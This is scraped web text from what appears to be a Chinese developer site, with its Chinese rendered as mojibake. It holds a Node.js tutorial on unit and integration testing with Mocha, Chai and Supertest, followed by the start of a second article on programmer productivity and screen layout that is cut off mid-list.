<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯å•å…ƒæµ‹è¯•</h2>
<p>å•å…ƒæµ‹è¯•ï¼ˆUnit Testingï¼‰æ˜¯æŒ‡å¯¹åº”ç”¨ä¸­æœ€å°å¯æµ‹è¯•å•å…ƒè¿›è¡ŒéªŒè¯ï¼Œé€šå¸¸æ˜¯å‡½æ•°ã€ç±»æˆ–æ¨¡å—ã€‚å®ƒå…³æ³¨çš„æ˜¯Â <strong>ä»£ç çš„åŠŸèƒ½æ­£ç¡®æ€§</strong>ã€‚</p>
<p>å•å…ƒæµ‹è¯•çš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li>â€¢ è¿è¡Œé€Ÿåº¦å¿«</li>
<li>â€¢ æµ‹è¯•èŒƒå›´å°ã€ç²¾ç¡®</li>
<li>â€¢ ä¾èµ–å°½é‡å°‘ï¼Œé€šå¸¸ä¼šæ¨¡æ‹Ÿå¤–éƒ¨èµ„æº</li>
</ul>
<p>é€šè¿‡å•å…ƒæµ‹è¯•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¿«é€ŸéªŒè¯æ¯ä¸ªåŠŸèƒ½æ¨¡å—æ˜¯å¦æŒ‰é¢„æœŸå·¥ä½œã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€å¸¸ç”¨çš„ Node.js å•å…ƒæµ‹è¯•æ¡†æ¶</h2>
<p>Node.js ç¤¾åŒºæä¾›äº†ä¸°å¯Œçš„æµ‹è¯•å·¥å…·ï¼Œå¸¸ç”¨çš„å•å…ƒæµ‹è¯•æ¡†æ¶åŒ…æ‹¬ï¼š</p>
<ol>
<li>1.Â <strong>Mocha</strong></li>
<li>
<ul>
<li>â€¢ çµæ´»ã€è½»é‡çº§</li>
<li>â€¢ ä¸æ–­è¨€åº“ Chai æ­é…ä½¿ç”¨</li>
<li>â€¢ æ”¯æŒå¼‚æ­¥æµ‹è¯•</li>
</ul>
</li>
<li>2.Â <strong>Jest</strong></li>
<li>
<ul>
<li>â€¢ Facebook å‡ºå“ï¼ŒåŠŸèƒ½å®Œå–„</li>
<li>â€¢ å†…ç½®æ–­è¨€åº“ã€Mock åŠŸèƒ½</li>
<li>â€¢ æ”¯æŒå¿«ç…§æµ‹è¯•</li>
</ul>
</li>
<li>3.Â <strong>AVA</strong></li>
<li>
<ul>
<li>â€¢ å¹¶è¡Œæ‰§è¡Œæµ‹è¯•ï¼Œé€Ÿåº¦å¿«</li>
<li>â€¢ ç®€æ´çš„è¯­æ³•</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€Node.js å•å…ƒæµ‹è¯•ç¤ºä¾‹</h2>
<p>ä¸‹é¢ä»¥Â <strong>Mocha + Chai</strong>Â ä¸ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•ç¼–å†™å•å…ƒæµ‹è¯•ã€‚</p>
<ol>
<li>
<ol>
<li>å®‰è£…ä¾èµ–ï¼š</li>
</ol>
</li>
</ol>
<pre><code class="hljs language-css" lang="css">npmÂ installÂ mochaÂ chaiÂ <span class="hljs-attr">--save-dev</span>
</code></pre>
<ol>
<li>
<ol start="2">
<li>ç¼–å†™ä»£ç æ¨¡å—Â <code>math.js</code>ï¼š</li>
</ol>
</li>
</ol>
<pre><code class="hljs language-css" lang="css">functionÂ add(<span class="hljs-selector-tag">a</span>,Â <span class="hljs-selector-tag">b</span>)Â {
Â Â returnÂ <span class="hljs-selector-tag">a</span>Â +Â <span class="hljs-selector-tag">b</span>;
}

functionÂ multiply(<span class="hljs-selector-tag">a</span>,Â <span class="hljs-selector-tag">b</span>)Â {
Â Â returnÂ <span class="hljs-selector-tag">a</span>Â *Â <span class="hljs-selector-tag">b</span>;
}

module<span class="hljs-selector-class">.exports</span>Â =Â {Â add,Â multiplyÂ };
</code></pre>
<ol>
<li>
<ol start="3">
<li>ç¼–å†™å•å…ƒæµ‹è¯•Â <code>test/math.test.js</code>ï¼š</li>
</ol>
</li>
</ol>
<pre><code class="hljs language-scss" lang="scss">constÂ {Â expectÂ }Â =Â <span class="hljs-built_in">require</span>('chai');
constÂ {Â add,Â multiplyÂ }Â =Â <span class="hljs-built_in">require</span>('../math');

<span class="hljs-built_in">describe</span>('MathÂ Module',Â ()Â =&gt;Â {
Â Â <span class="hljs-built_in">it</span>('shouldÂ addÂ twoÂ numbersÂ correctly',Â ()Â =&gt;Â {
Â Â Â Â <span class="hljs-built_in">expect</span>(add(<span class="hljs-number">2</span>,Â <span class="hljs-number">3</span>))<span class="hljs-selector-class">.to</span><span class="hljs-selector-class">.equal</span>(<span class="hljs-number">5</span>);
Â Â });

Â Â <span class="hljs-built_in">it</span>('shouldÂ multiplyÂ twoÂ numbersÂ correctly',Â ()Â =&gt;Â {
Â Â Â Â <span class="hljs-built_in">expect</span>(multiply(<span class="hljs-number">2</span>,Â <span class="hljs-number">3</span>))<span class="hljs-selector-class">.to</span><span class="hljs-selector-class">.equal</span>(<span class="hljs-number">6</span>);
Â Â });
});
</code></pre>
<ol>
<li>
<ol start="4">
<li>è¿è¡Œæµ‹è¯•ï¼š</li>
</ol>
</li>
</ol>
<pre><code class="hljs">npxÂ mocha
</code></pre>
<p>è¿è¡Œåï¼ŒMocha ä¼šè¾“å‡ºæµ‹è¯•ç»“æœï¼ŒéªŒè¯åŠŸèƒ½æ˜¯å¦æ­£ç¡®ã€‚</p>
<hr/>
<h2 data-id="heading-3">å››ã€ä»€ä¹ˆæ˜¯é›†æˆæµ‹è¯•</h2>
<p>é›†æˆæµ‹è¯•ï¼ˆIntegration Testingï¼‰ç”¨äºæµ‹è¯•Â <strong>æ¨¡å—ä¹‹é—´çš„äº¤äº’</strong>ã€‚å®ƒå…³æ³¨çš„æ˜¯å¤šä¸ªç»„ä»¶ç»„åˆåœ¨ä¸€èµ·æ—¶ï¼Œç³»ç»Ÿæ˜¯å¦æŒ‰é¢„æœŸå·¥ä½œã€‚</p>
<p>é›†æˆæµ‹è¯•çš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li>â€¢ æ¶‰åŠå¤šä¸ªæ¨¡å—æˆ–ç³»ç»Ÿ</li>
<li>â€¢ å¯èƒ½ä¾èµ–æ•°æ®åº“ã€ç¼“å­˜æˆ–ç¬¬ä¸‰æ–¹æœåŠ¡</li>
<li>â€¢ æµ‹è¯•èŒƒå›´æ¯”å•å…ƒæµ‹è¯•å¤§</li>
</ul>
<p>é€šè¿‡é›†æˆæµ‹è¯•ï¼Œå¯ä»¥å‘ç°æ¨¡å—æ¥å£ä¸åŒ¹é…ã€æ•°æ®ä¼ é€’é”™è¯¯ç­‰é—®é¢˜ã€‚</p>
<hr/>
<h2 data-id="heading-4">äº”ã€Node.js é›†æˆæµ‹è¯•ç¤ºä¾‹</h2>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª Express åº”ç”¨ï¼Œéœ€è¦æµ‹è¯•è·¯ç”±å’Œæ•°æ®åº“äº¤äº’ã€‚</p>
<ol>
<li>
<ol>
<li>å®‰è£…ä¾èµ–ï¼š</li>
</ol>
</li>
</ol>
<pre><code class="hljs language-css" lang="css">npmÂ installÂ supertestÂ mochaÂ chaiÂ <span class="hljs-attr">--save-dev</span>
</code></pre>
<ol>
<li>
<ol start="2">
<li>ç¼–å†™ Express åº”ç”¨Â <code>app.js</code>ï¼š</li>
</ol>
</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">constÂ <span class="hljs-attr">express</span>Â =Â require(<span class="hljs-string">'express'</span>)<span class="hljs-comment">;</span>
constÂ <span class="hljs-attr">app</span>Â =Â express()<span class="hljs-comment">;</span>

app.get('/api/hello',Â (req,Â res)Â =&gt;Â {
Â Â res.json({Â message:Â 'Hello,Â Node.js!'Â })<span class="hljs-comment">;</span>
})<span class="hljs-comment">;</span>

<span class="hljs-attr">module.exports</span>Â =Â app<span class="hljs-comment">;</span>
</code></pre>
<ol>
<li>
<ol start="3">
<li>ç¼–å†™é›†æˆæµ‹è¯•Â <code>test/app.test.js</code>ï¼š</li>
</ol>
</li>
</ol>
<pre><code class="hljs language-scss" lang="scss">constÂ requestÂ =Â <span class="hljs-built_in">require</span>('supertest');
constÂ {Â expectÂ }Â =Â <span class="hljs-built_in">require</span>('chai');
constÂ appÂ =Â <span class="hljs-built_in">require</span>('../app');

<span class="hljs-built_in">describe</span>('APIÂ IntegrationÂ Test',Â ()Â =&gt;Â {
Â Â <span class="hljs-built_in">it</span>('shouldÂ returnÂ helloÂ message',Â asyncÂ ()Â =&gt;Â {
Â Â Â Â constÂ resÂ =Â awaitÂ <span class="hljs-built_in">request</span>(app)<span class="hljs-selector-class">.get</span>('/api/hello');
Â Â Â Â <span class="hljs-built_in">expect</span>(res.status)<span class="hljs-selector-class">.to</span><span class="hljs-selector-class">.equal</span>(<span class="hljs-number">200</span>);
Â Â Â Â <span class="hljs-built_in">expect</span>(res.body.message)<span class="hljs-selector-class">.to</span><span class="hljs-selector-class">.equal</span>('Hello,Â Node.js!');
Â Â });
});
</code></pre>
<ol>
<li>
<ol start="4">
<li>è¿è¡Œæµ‹è¯•ï¼š</li>
</ol>
</li>
</ol>
<pre><code class="hljs">npxÂ mocha
</code></pre>
<p>é›†æˆæµ‹è¯•å¯ä»¥éªŒè¯è·¯ç”±æ˜¯å¦æ­£å¸¸ã€æ¥å£è¿”å›æ•°æ®æ˜¯å¦æ­£ç¡®ï¼Œä»è€Œä¿è¯ç³»ç»Ÿæ•´ä½“åŠŸèƒ½çš„ç¨³å®šæ€§ã€‚</p>
<hr/>
<h2 data-id="heading-5">å…­ã€å•å…ƒæµ‹è¯•ä¸é›†æˆæµ‹è¯•çš„åŒºåˆ«</h2>






























<table><thead><tr><th>ç‰¹æ€§</th><th>å•å…ƒæµ‹è¯•</th><th>é›†æˆæµ‹è¯•</th></tr></thead><tbody><tr><td>æµ‹è¯•èŒƒå›´</td><td>å•ä¸ªå‡½æ•°æˆ–æ¨¡å—</td><td>å¤šä¸ªæ¨¡å—æˆ–ç³»ç»Ÿ</td></tr><tr><td>ä¾èµ–</td><td>å°½é‡å°‘</td><td>å¯èƒ½ä¾èµ–æ•°æ®åº“ã€API</td></tr><tr><td>è¿è¡Œé€Ÿåº¦</td><td>å¿«</td><td>è¾ƒæ…¢</td></tr><tr><td>ç›®çš„</td><td>éªŒè¯åŠŸèƒ½æ­£ç¡®æ€§</td><td>éªŒè¯æ¨¡å—äº¤äº’æ­£ç¡®æ€§</td></tr></tbody></table>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œé€šå¸¸<strong>å•å…ƒæµ‹è¯•è¦†ç›–æ ¸å¿ƒé€»è¾‘</strong>ï¼Œè€Œ<strong>é›†æˆæµ‹è¯•è¦†ç›–å…³é”®ä¸šåŠ¡æµç¨‹</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-6">ä¸ƒã€æµ‹è¯•å®è·µå»ºè®®</h2>
<ol>
<li>1.Â <strong>æµ‹è¯•ä¼˜å…ˆ</strong><br/>
ç¼–å†™åŠŸèƒ½ä»£ç å‰ï¼Œå…ˆå†™æµ‹è¯•ï¼ˆTDD æ€è·¯ï¼‰å¯ä»¥é™ä½ bug ç‡ã€‚</li>
<li>2.Â <strong>è¦†ç›–ç‡åˆç†</strong><br/>
æ ¸å¿ƒä¸šåŠ¡æ¨¡å—å¿…é¡»æœ‰å®Œæ•´æµ‹è¯•ï¼Œä½†æ— éœ€æ¯ä¸ªå°å‡½æ•°éƒ½æµ‹è¯•ã€‚</li>
<li>3.Â <strong>ä½¿ç”¨ Mock</strong><br/>
æ¨¡æ‹Ÿæ•°æ®åº“æˆ–ç¬¬ä¸‰æ–¹æœåŠ¡ï¼Œæé«˜æµ‹è¯•é€Ÿåº¦å’Œç¨³å®šæ€§ã€‚</li>
<li>4.Â <strong>è‡ªåŠ¨åŒ–æµ‹è¯•</strong><br/>
é…åˆ CI/CD å·¥å…·ï¼ˆå¦‚ GitHub Actionsã€Jenkinsï¼‰è‡ªåŠ¨è¿è¡Œæµ‹è¯•ï¼Œä¿è¯ä»£ç è´¨é‡ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-7">å…«ã€æ€»ç»“</h2>
<p>åœ¨ Node.js é¡¹ç›®ä¸­ï¼Œå•å…ƒæµ‹è¯•å’Œé›†æˆæµ‹è¯•æ˜¯ä¿è¯ä»£ç è´¨é‡ã€æé«˜å¼€å‘æ•ˆç‡çš„å…³é”®æ‰‹æ®µã€‚å•å…ƒæµ‹è¯•ä¸“æ³¨äºéªŒè¯å•ä¸ªæ¨¡å—åŠŸèƒ½ï¼Œè¿è¡Œå¿«é€Ÿï¼›é›†æˆæµ‹è¯•å…³æ³¨æ¨¡å—ä¹‹é—´çš„åä½œå’Œç³»ç»Ÿæ•´ä½“åŠŸèƒ½ï¼Œèƒ½å¤Ÿå‘ç°æ¥å£æˆ–æ•°æ®ä¼ é€’é—®é¢˜ã€‚</p>
<p>é€šè¿‡åˆç†åœ°è®¾è®¡æµ‹è¯•ç­–ç•¥ã€é€‰æ‹©åˆé€‚çš„å·¥å…·ï¼Œå¹¶ç»“åˆè‡ªåŠ¨åŒ–æµç¨‹ï¼ŒNode.js å¼€å‘è€…å¯ä»¥åœ¨ä¿è¯åŠŸèƒ½ç¨³å®šçš„åŒæ—¶ï¼ŒåŠ é€Ÿé¡¹ç›®è¿­ä»£ï¼Œæå‡äº§å“è´¨é‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç«–å±ï¼Œå…¶å®æ˜¯ç¨‹åºå‘˜çš„ä¸€ä¸ªé›†ä½“è¯¯è§£]]></title>    <link>https://juejin.cn/post/7592816646854426674</link>    <guid>https://juejin.cn/post/7592816646854426674</guid>    <pubDate>2026-01-08T04:08:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592816646854426674" data-draft-id="7592582130594807859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç«–å±ï¼Œå…¶å®æ˜¯ç¨‹åºå‘˜çš„ä¸€ä¸ªé›†ä½“è¯¯è§£"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜,å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T04:08:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="loonggg"/> <meta itemprop="url" content="https://juejin.cn/user/1750078239286167"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç«–å±ï¼Œå…¶å®æ˜¯ç¨‹åºå‘˜çš„ä¸€ä¸ªé›†ä½“è¯¯è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1750078239286167/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    loonggg
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T04:08:30.000Z" title="Thu Jan 08 2026 04:08:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘ä»¥å‰æ€»è®¤ä¸ºç¨‹åºå‘˜æå‡æ•ˆç‡çš„å…³é”®åœ¨äºä¸€ä¸ªäººçš„æŠ€æœ¯èƒ½åŠ›ï¼Œæ˜¯ä¸æ˜¯ä¼šæ›´ä¼šå†™ä»£ç å•Šï¼Ÿå…¶å®ï¼Œåæ¥æˆ‘å‘ç°å¹¶ä¸æ˜¯ã€‚å› ä¸ºæŠ€æœ¯ä»£è¡¨çš„æ˜¯ä½ èƒ½å¦æŠŠä»£ç å†™å¥½ï¼Œè€Œæ•ˆç‡è¿™ä»¶äº‹ï¼Œå¯èƒ½è·Ÿç¼–ç ä¹ æƒ¯å’Œä½¿ç”¨å·¥å…·æœ‰å…³ã€‚</p>
<p>å¦‚æœä½ æ˜¯ç»å¸¸å¤§é‡ç¼–ç¨‹çš„ç¨‹åºå‘˜ï¼Œä½ åº”è¯¥ä¼šæœ‰è¿™ç§æ„Ÿå—ï¼ŒçœŸæ­£æ‹–æ…¢ä½ ç¼–ç¨‹èŠ‚å¥çš„ï¼Œå¾€å¾€æ˜¯è¿™äº›ç¬é—´ï¼š</p>
<ul>
<li>
<p>ä¸€ä¸ªå°æ”¹åŠ¨è¦åœ¨ ä»£ç  / æ–‡æ¡£ / ç»ˆç«¯ / æµè§ˆå™¨ / æ—¥å¿— / PR ä¹‹é—´æ¥å›åˆ‡æ¢</p>
</li>
<li>
<p>ä½ æ˜æ˜çŸ¥é“è¦æ”¹å“ªé‡Œï¼Œä½†å°±æ˜¯å¾—ä¸æ–­ æŠ˜å ä¾§æ ã€åˆ‡ tabã€æ‹–çª—å£</p>
</li>
<li>
<p>ä½ å¼€å§‹è§‰å¾—è‡ªå·±æ³¨æ„åŠ›å·®ã€çŠ¶æ€å·®ï¼Œå®é™…ä¸Šåªæ˜¯ç•Œé¢æ”¾ä¸ä¸‹</p>
</li>
</ul>
<p>å½“ä½ è¢«è¿«æŠŠå·¥ä½œåˆ‡æˆç¢ç‰‡ï¼Œæ•ˆç‡ä¸‹é™è¿™æ˜¯å¿…ç„¶çš„ã€‚</p>
<p>æ‰€ä»¥ï¼Œä»Šå¤©æˆ‘æƒ³è·Ÿå¤§å®¶èŠä¸¤ä»¶äº‹ï¼š</p>
<p>1ã€ä½œä¸ºç¨‹åºå‘˜ï¼Œå“ªäº›â€œä½æˆæœ¬â€çš„ä¹ æƒ¯å’Œå·¥å…·ï¼Œèƒ½ç«‹åˆ»æé€Ÿï¼›</p>
<p>2ã€ä¸€ä¸ªæ›´å®¹æ˜“è¢«å¿½ç•¥ã€ä½†é•¿æœŸæ”¶ç›Šå·¨å¤§çš„ç‚¹ï¼šå±å¹•å¸ƒå±€ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ç¨‹åºå‘˜ææ•ˆï¼šå…ˆæŠŠâ€œè¾“å‡ºè·¯å¾„â€æ‰“é€š</h2>
<p>æˆ‘å…ˆè¯´ç»“è®ºï¼šç¼–ç¨‹æ•ˆç‡ä¸ç­‰äºæ‰“å­—é€Ÿåº¦ï¼Œä¹Ÿä¸ç­‰äºè®°ä½å¤šå°‘ APIã€‚æ•ˆç‡æ¥è‡ªä¸€æ¡æ›´çŸ­ã€æ›´ç¨³å®šçš„è¾“å‡ºè·¯å¾„ï¼š</p>
<p>éœ€æ±‚ â†’ ç†è§£ â†’ å®ç° â†’ éªŒè¯ â†’ è¿­ä»£</p>
<p>ä½ è¶Šå°‘åœ¨è¿™æ¡è·¯å¾„ä¸Šâ€œæ‰çº¿â€ï¼Œä½ è¶Šå¿«ã€‚æˆ‘å°±ä»ç¨‹åºå‘˜æ—¥å¸¸ç¼–ç¨‹çš„ 3 ä¸ªç‚¹æ¥ç®€å•è§£é‡Šä¸€ä¸‹ã€‚</p>
<h3 data-id="heading-1">1ã€å‡å°‘ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼šæŠŠå¸¸ç”¨æ“ä½œå˜æˆè‚Œè‚‰è®°å¿†</h3>
<p>æˆ‘å‘ç°èº«è¾¹å…¶å®å¾ˆå¤šç¨‹åºå‘˜æœ‹å‹ç¼–ç¨‹å¹¶ä¸å¤ªçˆ±ä½¿ç”¨å¿«æ·é”®ï¼Œå¯èƒ½è·Ÿé›†æˆ IDE å‘å±•æœ‰å…³ï¼Œè®©æˆ‘ä»¬å˜å¾—æ¯”è¾ƒæ‡’äº†ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œå¯èƒ½ IDE ä¼šè‡ªåŠ¨æç¤ºï¼Œä½†æ˜¯ï¼Œæˆ‘æ„Ÿè§‰è¿™è¿˜ä¸å¤Ÿã€‚æˆ‘è®¤ä¸ºç¼–ç¨‹ä¸­æœ‰å¾ˆå¤šå°ç»†èŠ‚çš„ä¼˜åŒ–ï¼Œèƒ½å¤Ÿå¤§å¤§æé«˜ç¼–ç¨‹æ•ˆç‡ï¼Œå°±åƒæ˜¯æ‰“ç¯®çƒçš„è‚Œè‚‰è®°å¿†ä¸€æ ·ï¼Œå½“ä½ æœ‰äº†è‚Œè‚‰è®°å¿†ï¼Œå¾ˆå¤šäº‹æƒ…å°±ä¼šè‡ªç„¶å‘ç”Ÿï¼Œæ‰€ä»¥ï¼Œæ•ˆç‡å¸¸å¸¸éšè—åœ¨æˆ‘ä»¬ä¸æ³¨æ„çš„å°ç»†èŠ‚é‡Œã€‚</p>
<p>æˆ‘è®¤ä¸ºï¼Œä½ å¯ä»¥ä¸èƒŒå¿«æ·é”®å¤§å…¨ï¼Œä½†ä¸€å®šè¦å›ºå®šä¸€å¥—â€œé«˜é¢‘åŠ¨ä½œâ€ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>
<p>å…¨å±€æœç´¢/ç¬¦å·æœç´¢ï¼ˆæ¯”é¼ æ ‡ç‚¹æ–‡ä»¶å¿«ä¸€ä¸ªæ•°é‡çº§ï¼‰</p>
</li>
<li>
<p>è·³è½¬å®šä¹‰ / è·³å›</p>
</li>
<li>
<p>å¿«é€Ÿåˆ‡æ¢æœ€è¿‘æ–‡ä»¶</p>
</li>
<li>
<p>ä¸€é”®æ ¼å¼åŒ– + ä¸€é”®é‡æ„ï¼ˆrename / extract methodï¼‰</p>
</li>
</ul>
<p>ç­‰ç­‰å§ï¼Œæˆ‘çš„å»ºè®®åšæ³•å¾ˆç®€å•ï¼šæ¯å‘¨åªç»ƒ 3 ä¸ªå¿«æ·é”®ï¼Œç»ƒå¥½è¯—æ­Œå¸¸ç”¨çš„å¿«æ·é”®ï¼Œä¸¤å‘¨ä½ å°±æœ‰è´¨å˜ã€‚è¿™ç§å˜åŒ–ï¼Œçœ‹ä¼¼çœ‹ä¸è§æ‘¸ä¸ç€ï¼Œä½†æ˜¯ï¼Œç¡®å®èƒ½å¤Ÿå¤§å¤§æé«˜æ•ˆç‡ã€‚</p>
<h3 data-id="heading-2">2ã€å»ºç«‹å¯å¤ç”¨çš„â€œè°ƒè¯•è„šæœ¬â€</h3>
<p>æˆ‘è§è¿‡å¤ªå¤šäººè°ƒè¯•å…¨é æ„Ÿè§‰ï¼šä»Šå¤©èƒ½æå®šï¼Œçº¯é å½“ä¸‹çŠ¶æ€ï¼›éš”ä¸¤å‘¨åŒæ ·çš„é—®é¢˜åˆæ¥ä¸€éï¼Œåˆè¦é‡æ–°æ‘¸ç´¢ã€‚å…¶å®ï¼Œè°ƒè¯•è¿™ä»¶äº‹æœ€åäººæ€§çš„ä¸€ç‚¹æ˜¯ï¼šä½ è§£å†³é—®é¢˜çš„é‚£ä¸€åˆ»ï¼Œå¾€å¾€ä¹Ÿæ˜¯ä½ æœ€ä¸æƒ³è®°å½•çš„é‚£ä¸€åˆ»ã€‚ä½†ç°å®é‡Œï¼Œå¾ˆå¤šçº¿ä¸Šé—®é¢˜ä¼šé‡å¤å‡ºç°ï¼Œæˆ–è€…ä¼šè¢«åˆ«äººï¼ˆæœªæ¥çš„ä½ ï¼‰é‡å¤è¸©å‘ã€‚</p>
<p>æ‰€ä»¥ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä½ å¯ä»¥å»ºä¸€ä¸ª debug.md æˆ– README ç‰‡æ®µï¼ŒæŠŠè¿™äº›å›ºåŒ–ä¸‹æ¥ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>
<p>å¤ç°æ­¥éª¤</p>
</li>
<li>
<p>å¸¸ç”¨ curl/postman ç¤ºä¾‹</p>
</li>
<li>
<p>å…³é”®æ—¥å¿—å…³é”®è¯</p>
</li>
<li>
<p>å¸¸è§å‘ä½</p>
